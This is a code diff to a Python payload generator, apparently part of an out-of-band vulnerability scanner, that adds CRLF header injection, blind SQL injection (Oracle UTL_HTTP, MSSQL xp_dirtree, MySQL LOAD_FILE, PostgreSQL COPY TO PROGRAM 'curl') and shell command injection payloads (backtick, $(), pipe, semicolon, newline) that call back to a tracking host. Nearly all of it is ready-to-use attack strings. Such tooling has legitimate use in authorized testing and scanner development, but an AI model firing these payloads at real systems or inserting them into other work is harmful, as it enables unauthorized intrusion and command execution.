@@ -1,6 +1,9 @@
 """
-OOB payload generator — SSRF / XXE / SSTI / RCE templates.
-Each payload embeds a unique interaction_id for phantom-grid tracking.
+OOB payload generator — SSRF / XXE / SSTI / RCE / CRLF / SQLi / CMDi templates.
+
+Each payload embeds a unique interaction_id (phantom-grid token) for tracking.
+HTTP callbacks target the v2.0 capture endpoint: http://<host>/c/<token>.
+DNS callbacks use <token>.<host>.
 """
 
 from typing import Dict, List
@@ -8,7 +11,7 @@ from typing import Dict, List
 
 def generate_ssrf_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
     """HTTP/DNS SSRF payloads pointing to phantom-grid."""
-    base = f"{grid_host}/{interaction_id}"
+    base = f"{grid_host}/c/{interaction_id}"
     dns = f"{interaction_id}.{grid_host}"
     return [
         {
@@ -36,7 +39,7 @@ def generate_ssrf_payloads(grid_host: str, interaction_id: str) -> List[Dict[str
 
 def generate_xxe_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
     """Blind XXE payloads with OOB DNS/HTTP exfil."""
-    url = f"http://{grid_host}/{interaction_id}"
+    url = f"http://{grid_host}/c/{interaction_id}"
     return [
         {
             "type": "xxe_oob_http",
@@ -107,7 +110,7 @@ def generate_ssti_payloads() -> List[Dict[str, str]]:
 
 def generate_rce_oob_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
     """OOB RCE confirmation payloads via DNS/HTTP callback."""
-    url = f"http://{grid_host}/{interaction_id}"
+    url = f"http://{grid_host}/c/{interaction_id}"
     return [
         {
             "type": "rce_curl",
@@ -132,6 +135,96 @@ def generate_rce_oob_payloads(grid_host: str, interaction_id: str) -> List[Dict[
     ]
 
 
+def generate_crlf_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
+    """CRLF / HTTP header injection with OOB callback confirmation."""
+    cb = f"http://{grid_host}/c/{interaction_id}"
+    return [
+        {
+            "type": "crlf_header_inject",
+            "payload": f"%0d%0aLocation:%20{cb}",
+            "description": "CRLF — inject Location header redirect to phantom-grid",
+        },
+        {
+            "type": "crlf_response_split",
+            "payload": (
+                f"%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/c/{interaction_id}%20HTTP/1.1"
+            ),
+            "description": "CRLF — response splitting with embedded callback path",
+        },
+        {
+            "type": "crlf_set_cookie",
+            "payload": f"%0d%0aSet-Cookie:%20oob={interaction_id}",
+            "description": "CRLF — Set-Cookie injection marker",
+        },
+    ]
+
+
+def generate_sqli_oob_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
+    """Blind SQLi OOB exfiltration — Oracle / MSSQL / MySQL / PostgreSQL."""
+    http = f"http://{grid_host}/c/{interaction_id}"
+    dns = f"{interaction_id}.{grid_host}"
+    return [
+        {
+            "type": "sqli_oracle_utl_http",
+            "payload": f"' || UTL_HTTP.REQUEST('{http}') || '",
+            "description": "Oracle OOB via UTL_HTTP.REQUEST",
+        },
+        {
+            "type": "sqli_oracle_dns",
+            "payload": (f"' || (SELECT DBMS_LDAP.INIT('{dns}',80) FROM DUAL) || '"),
+            "description": "Oracle OOB DNS via DBMS_LDAP.INIT",
+        },
+        {
+            "type": "sqli_mssql_xp_dirtree",
+            "payload": f"'; EXEC master..xp_dirtree '\\\\{dns}\\x'; --",
+            "description": "MSSQL OOB via xp_dirtree UNC path (SMB/DNS)",
+        },
+        {
+            "type": "sqli_mysql_load_file",
+            "payload": f"' UNION SELECT LOAD_FILE(CONCAT('\\\\{dns}\\a')) -- -",
+            "description": "MySQL OOB via LOAD_FILE UNC (Windows)",
+        },
+        {
+            "type": "sqli_pg_copy_program",
+            "payload": f"'; COPY (SELECT '') TO PROGRAM 'curl {http}'; --",
+            "description": "PostgreSQL OOB via COPY TO PROGRAM",
+        },
+    ]
+
+
+def generate_cmdi_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
+    """Command injection OOB — separators with HTTP/DNS callback."""
+    http = f"http://{grid_host}/c/{interaction_id}"
+    dns = f"{interaction_id}.{grid_host}"
+    return [
+        {
+            "type": "cmdi_backtick",
+            "payload": f"`curl {http}`",
+            "description": "CMDi via backtick substitution",
+        },
+        {
+            "type": "cmdi_dollar_paren",
+            "payload": f"$(curl {http})",
+            "description": "CMDi via $() substitution",
+        },
+        {
+            "type": "cmdi_pipe",
+            "payload": f"| curl {http}",
+            "description": "CMDi via pipe",
+        },
+        {
+            "type": "cmdi_semicolon",
+            "payload": f"; curl {http}",
+            "description": "CMDi via semicolon separator",
+        },
+        {
+            "type": "cmdi_dns_newline",
+            "payload": f"%0anslookup {dns}",
+            "description": "CMDi via newline + DNS lookup",
+        },
+    ]
+
+
 def get_all_payloads(grid_host: str, interaction_id: str) -> Dict[str, List[Dict[str, str]]]:
     """Return all payload categories keyed by type."""
     return {
@@ -139,4 +232,7 @@ def get_all_payloads(grid_host: str, interaction_id: str) -> Dict[str, List[Dict
         "xxe": generate_xxe_payloads(grid_host, interaction_id),
         "ssti": generate_ssti_payloads(),
         "rce": generate_rce_oob_payloads(grid_host, interaction_id),
+        "crlf": generate_crlf_payloads(grid_host, interaction_id),
+        "sqli": generate_sqli_oob_payloads(grid_host, interaction_id),
+        "cmdi": generate_cmdi_payloads(grid_host, interaction_id),
     }
